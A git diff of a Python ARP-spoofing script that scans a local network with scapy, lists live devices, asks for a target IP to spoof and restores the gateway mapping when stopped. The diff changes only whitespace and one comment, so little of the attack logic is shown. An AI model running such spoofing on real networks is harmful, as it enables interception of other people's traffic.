@@ -1,4 +1,3 @@
-
 import multiprocessing
 from getmac import get_mac_address
 import scapy.all as scapy
@@ -22,8 +21,7 @@ def GetMask() ->str:
     except ValueError:
         print("Invalid subnet mask format. Please enter a valid subnet mask format.")    
         return GetMask()   
-    return str(maskCounter)
-    
+    return str(maskCounter)    
         
 #scans the network for devices and stores their IP and MAC addresses in a dictionary.
 def scan(Default, Targetdict,mask, my_ip):
@@ -66,8 +64,6 @@ def restore(Router_ip, verbose):
     if(verbose):
         print(f"Sent broadcast ARP response: {Router_ip} is-at {router_mac} ")
 
-
-
 if __name__ == "__main__":
     defaultGatway = input("Enter the default gateway: ")
     Router_mac = get_mac_address(ip=defaultGatway)
@@ -84,11 +80,10 @@ if __name__ == "__main__":
         print("No live devices found in the network.")
         time.sleep(2)
         exit(0)
-    #else, print the live devices found in the network.
+    #else, print the live devices found in the network and continue into the spoofing.
     print("Live device found: ")
     for key,value in Targetdict.items():
        print(f"IP: {key}, MAC: {value}")
-
     try:
         while True:
             key= input("Enter the target IP address to spoof (or 'cntl c' to quit): ")
@@ -101,7 +96,3 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         print("cntl c was pressed, stopping ARP spoofing..")
         restore(defaultGatway,True)
-
-
-
-
